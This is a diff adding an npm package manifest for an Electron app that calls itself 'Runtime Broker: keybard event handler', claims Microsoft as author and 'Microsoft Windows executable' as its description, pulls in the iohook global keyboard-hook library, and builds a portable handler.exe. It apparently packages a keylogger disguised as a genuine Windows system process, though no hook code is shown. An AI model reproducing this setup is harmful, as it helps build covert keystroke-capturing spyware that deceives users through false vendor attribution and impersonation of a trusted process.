@@ -1,0 +1,38 @@
+{
+  "name": "runtime_broker_event_handler",
+  "productName": "Runtime Broker: keybard event handler",
+  "version": "1.0.0",
+  "description": "Microsoft Windows executable",
+  "main": "index.js",
+  "bin": "index.js",
+  "icon": "icon.ico",
+  "scripts": {
+    "test": "node ."
+  },
+  "author": "Microsoft",
+  "license": "ISC",
+  "dependencies": {
+    "iohook": "^0.6.6",
+    "node-check-windows-capslock": "^1.0.1"
+  },
+  "devDependencies": {
+    "electron": "^2.0.0"
+  },
+  "build": {
+    "productName": "Runtime Broker: keybard event handler",
+    "win": {
+      "target": [
+        "portable"
+      ]
+    },
+    "portable": {
+      "artifactName": "handler.exe"
+    }
+  },
+  "iohook": {
+    "targets": [
+      "electron-76",
+      "node-72"
+    ]
+  }
+}
